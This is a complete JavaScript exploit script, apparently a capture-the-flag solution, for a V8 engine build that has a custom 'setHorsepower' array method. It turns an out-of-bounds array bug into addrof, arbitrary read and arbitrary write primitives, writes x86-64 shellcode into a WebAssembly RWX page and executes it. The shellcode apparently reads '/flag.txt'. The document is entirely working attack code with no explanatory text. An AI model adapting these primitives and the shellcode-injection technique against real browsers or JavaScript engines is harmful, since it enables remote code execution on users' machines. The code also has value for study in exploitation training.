var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
  f64_buf[0] = val;
  return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
  u64_buf[0] = Number(val & 0xffffffffn);
  u64_buf[1] = Number(val >> 32n);
  return f64_buf[0];
}

function hex(val) {
  return "0x" + val.toString(16)
}

leak_arr = [1.1, 2.2]
leak_arr.setHorsepower(0x8)
float_map = ftoi(leak_arr[2]) & 0xffffffffn
console.log("float_map: "+hex(float_map))

function arb_read(addr) {
  let oob_arr = [1.1, 2.2]
  oob_arr.setHorsepower(0x8)
  oob_arr[3] = itof((addr - 8n) | (0x8n << 32n))
  return ftoi(oob_arr[0])
}

function arb_write(addr, val) {
  let oob_arr = [1.1, 2.2]
  oob_arr.setHorsepower(0x8)
  oob_arr[3] = itof((addr - 8n) | (0x8n << 32n))
  oob_arr[0] = itof(val)
}

function addrof(obj) {
  fl_arr = [1.1, 2.2]
  obj_arr = [obj, obj]
  fl_arr.setHorsepower(0x40)
  fl_arr[6] = itof(float_map)
  return ftoi(obj_arr[0]) & 0xffffffffn
}

function copy_shellcode(address, shellcode) {
  arr_buff = new ArrayBuffer(0x100);
  dataview = new DataView(arr_buff)
  arr_buff_addr = addrof(arr_buff)

  console.log("arr_buff: "+hex(arr_buff_addr & 0xffffffffn))
  arb_write(arr_buff_addr + 0x14n, address)

  for (i=0; i<shellcode.length; i++) {
    dataview.setFloat64(i*8, shellcode[i], true)
  }
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

rwx_address = arb_read(addrof(wasm_instance) + 0x68n)
console.log("RWX address: " + hex(rwx_address))

shellcode = [itof(0x48000000303d8d48n),itof(0xc0c748d23148f631n),itof(0x8948050f00000002n),itof(0x00000001c7c748c6n),itof(0x4900000000c2c748n),itof(0xc74800000100c2c7n),itof(0x2e050f00000028c0n),itof(0x78742e67616c662fn),itof(0x0074n),]
console.log("Copying shellcode...")
copy_shellcode(rwx_address, shellcode)
console.log("Executing shellcode...")
f()
